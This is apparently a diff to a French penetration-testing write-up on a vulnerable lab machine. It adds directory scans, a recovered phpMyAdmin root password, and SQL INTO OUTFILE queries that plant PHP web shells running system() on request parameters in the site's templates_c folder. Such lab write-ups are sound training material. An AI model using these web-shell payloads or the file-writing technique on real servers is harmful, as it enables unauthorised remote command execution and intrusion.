@@ -62,10 +62,10 @@ Nmap done: 1 IP address (1 host up) scanned in 4.71 seconds
 ```
 
 L'adresse `192.168.1.22` dispose d'un site web qui nous affiche une page avec ecrit `HACK ME`. Après différents tests et quelques recherche on trouve différents moyen de découvrir des fails et d'autres pages accessibles.
-Nous avons utilisez le `web scanner` `Arachni` . Une alternative plus light pour Arachni est le package `dirb` pour linux.
 
+Nous avons utilisez les `web scanner` `Arachni`, `dirb` et `nikto`, tous présent par défault sur l'os `kali` .
 
-Nous avons travailler avec l'os `Kali` sur `wsl` a partir de maintenant car celui-ci inclut la plupart des outils de `Pen Testing` dont nous aurons besoin par la suite .
+Nous allons travailler avec l'os `Kali` sur `wsl` à partir de maintenant car celui-ci inclut la plupart des outils de `Pen Testing` dont nous aurons besoin par la suite .
 
 ```bash
 └─$ dirb https://192.168.1.22/
@@ -111,8 +111,11 @@ You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$
 Best regards.
 ```
 
-Maintenant que l'on a un accès root à la db SQL, on cherche a faire une exploit appeler `web shell`. Grâce a `dirb` on peut obtenir une liste des dossiers utilisé par le site:
-`
+phpmyadmin user: `root`
+phpmyadmin password: `Fg-'kKXBj87E:aJ$`
+
+Maintenant que l'on a un accès root à la db SQL, on cherche a faire une exploit appelé `web shell`. Grâce a `dirb` on peut obtenir une liste des dossiers utilisés par le site: 
+
 ```bash
 └─$ dirb https://192.168.1.22/forum/
 
@@ -132,4 +135,27 @@ Maintenant que l'on a un accès root à la db SQL, on cherche a faire une exploi
 ==> DIRECTORY: https://192.168.1.22/webmail/plugins/
 ==> DIRECTORY: https://192.168.1.22/webmail/src/
 ==> DIRECTORY: https://192.168.1.22/webmail/themes/
+```
+
+On cherche a obtenir le dossier par default du serveur web :
+
+```bash
+└─$ whatweb https://192.168.1.22/
+https://192.168.1.22/ [404 Not Found] Apache[2.2.22], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.2.22 (Ubuntu)], IP[192.168.1.22], Title[404 Not Found]
+```
+Le serveur tourne sur Apache 2 donc `/var/www` pour le dossier par default.
+
+On cherche a créé une nouvelle page qui nous permettera d'utiliser le `shell`. Pour cela on utilise la commande `
+SELECT "<? system($_REQUEST['cmd']); ?>",2,3,4 INTO OUTFILE "/var/www/{folder}/{filename}.php" -- 1` avec les différents dossiers disponible pour en trouver un avec les droits d'écriture. On arrive a écrire notre fichier dans le dossier `templates_c`.
+
+La requete sql pour créé notre fichier web_shell:
+
+```sql
+SELECT "<html><body><pre><form method=\"GET\" name=\"<?php echo basename($_SERVER['PHP_SELF']); ?>\"><input type=\"TEXT\" name=\"cmd\" autofocus id=\"cmd\" size=\"80\"><input type=\"SUBMIT\" value=\"Execute\"></form><?php if(isset($_GET['cmd'])){echo 'Shell: ';system($_GET['cmd']);}?></pre></body></html>" INTO OUTFILE '/var/www/forum/templates_c/web_shell.php'
+```
+
+une option simplifier sans le html pour curl :
+
+```sql
+SELECT "<?php if(isset($_GET['cmd'])){system($_GET['cmd']);}?>" INTO OUTFILE '/var/www/forum/templates_c/curl_shell.php'
 ```
